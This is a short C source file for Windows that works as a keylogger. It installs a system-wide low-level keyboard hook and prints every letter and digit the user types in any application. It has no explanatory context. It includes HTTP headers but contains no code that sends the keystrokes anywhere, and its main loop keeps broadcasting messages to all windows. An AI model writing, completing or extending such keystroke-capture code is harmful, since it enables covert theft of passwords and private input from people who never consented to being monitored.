#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <http.h>
#include <winhttp.h>
#include <httprequest.h>
#include <stdint.h>

#define LOWERCASE_OFFSET 32


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* KBDLL_ptr = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            switch (KBDLL_ptr->vkCode) {
                case '0' ... '9': printf("%c", (char)KBDLL_ptr->vkCode); break;
                case 'A' ... 'Z': printf("%c", (char)KBDLL_ptr->vkCode + LOWERCASE_OFFSET);

                default: break;
            }
        }


    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

int main(void) {
    const int allThreads = 0;
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, allThreads);
    if (hook == NULL) exit(EXIT_FAILURE);
    while (true) {
        SendMessageA(HWND_BROADCAST, WM_CHAR, 0, 0);
    }
    UnhookWindowsHookEx(hook); // unreachable anyway

    return 0;
}